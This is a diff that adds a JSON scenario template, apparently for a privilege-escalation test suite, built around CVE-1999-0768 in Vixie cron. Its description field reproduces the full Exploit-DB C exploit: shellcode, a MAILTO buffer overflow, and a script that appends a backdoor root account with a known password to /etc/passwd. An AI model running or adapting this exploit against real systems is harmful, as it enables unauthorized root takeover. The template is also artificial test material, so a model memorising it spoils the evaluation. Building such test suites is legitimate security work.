@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_19469",
+  "category": "C1_cron",
+  "attack_technique": "T1053.003",
+  "cwe": "CWE-732",
+  "description": "Linux privilege escalation: RedHat Linux 4.2/5.2/6.0 / S.u.S.E Linux 6.0/6.1 - Cron Buffer Overflow (1) (CVE-1999-0768;OSVDB-1058)\n\nExploit source code (19469.c):\n```\n// source: https://www.securityfocus.com/bid/602/info\n\nThe version of Vixie cron that ships with RedHat versions 4.2, 5.2 and 6.0 is vulnerable to a local buffer overflow attack. By utilizing the MAILTO environment variable, a buffer can be overflown in the cron_popen() function, allowing an attacker to execute arbitrary code. Vixie cron daemon is installed setuid root by default, allowing for a local root compromise. Recent versions of Debian GNU/Linux have been confirmed to not be vulnerable to this attack.\n\n/*\n\tvixie-crontab-3.0.1 cron_popen() exploit by Akke - 30-8-99\n\t\t\tAkke <c4c4@hehe.com>\n\n\n\thow to compile ?\n\t\tgcc crontab_exploit.c -o crontab_exploit\n\n\thow to use ?\n\t\t./crontab_exploit\n\t\tcrontab ./CrOn\n\t\twait 1 minute\n\t\tcrontab -r\n\t\tsu -l cronexpl (password = exploited) (this is root account)\n\n\tGreets to: bugtraq\n*/\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nchar shellcode[] =\n\t\"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\"\n\t\"\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd\"\n\t\"\\x80\\xe8\\xdc\\xff\\xff\\xff/tmp/ce\";\n\n#define max_buf_len 1000\n#define CronFile         \"CrOn\"\n#define RootScript       \"/tmp/cron_root\"\n#define CronEchoScript   \"/tmp/cron_echo\"\n#define chmod_bin        \"/bin/chmod\"\n\nint main()\n{\n\tchar crontab_file_string[max_buf_len];\n\tchar temp[max_buf_len];\n\tFILE *fp;\n\tint i;\n\n\tstrcpy(temp,\n\t\"T h i s _ i s _ a _ s i m p l e _ e x p l o i t _ w r i t t e n _ b y _ A K K E _ \"\n\t\"T h i s _ i s _ a _ s i m p l e _ e x p l o i t _ w r i t t e n _ b y _ A K K E _ \"\n\t\"_ _ _ _ _ _ _ _ _ _ _ _ _ _ \");\n\tsprintf(temp,\"%s%s\",temp,shellcode);\n\tsprintf(crontab_file_string,\"MAILTO=%s\\n\",temp);\n\tstrcat(crontab_file_string,\"0\");\n\tfor (i=1;i<60;i++) sprintf(crontab_file_string,\"%s,%d\",crontab_file_string,i);\n\tsprintf(temp,\" * * * * %s\\n\",CronEchoScript);\n\tstrcat(crontab_file_string,temp);\n\n\tif ((fp = fopen(CronFile,\"w+\")) != NULL) {\n\t\tfprintf(fp,\"%s\",crontab_file_string);\n\t\tfclose(fp);\n\t}\n\n\tif ((fp = fopen(CronEchoScript,\"w+\")) != NULL) {\n\t\tfprintf(fp,\"#!/bin/sh\\necho Wrong window!\");\n\t\tfclose(fp);\n\t\tsprintf(temp,\"%s 777 %s\",chmod_bin,CronEchoScript);\n\t\tsystem(temp);\n\t}\n\n\tif ((fp = fopen(RootScript,\"w+\")) != NULL) {\n\t\t#define login \"cronexpl\"\n\t\t#define passw \"1T8uqGnJZ0OsQ\" /* \"exploited\" */\n\t\tfprintf(fp,\"#!/bin/sh\\necho %s:%s:0:0::/root:/bin/bash >> /etc/passwd\\nrm %s %s %s\",login,passw,CronEchoScript,\"/tmp/ce\",RootScript);\n\t\tfclose(fp);\n\t\tsprintf(temp,\"%s 777 %s\",chmod_bin,RootScript);\n\t\tsystem(temp);\n\t}\n\n\tif ((fp = fopen(\"/tmp/ce\",\"w+\")) != NULL) {\n\t\tfprintf(fp,\"#!/bin/sh\\n%s\\n\",RootScript);\n\t\tfclose(fp);\n\t\tsprintf(temp,\"%s 777 %s\",chmod_bin,\"/tmp/ce\");\n\t\tsystem(temp);\n\t}\n\texit(0);\n}\n```",
+  "cve": "CVE-1999-0768;OSVDB-1058",
+  "exploitdb_id": "19469",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_19469",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
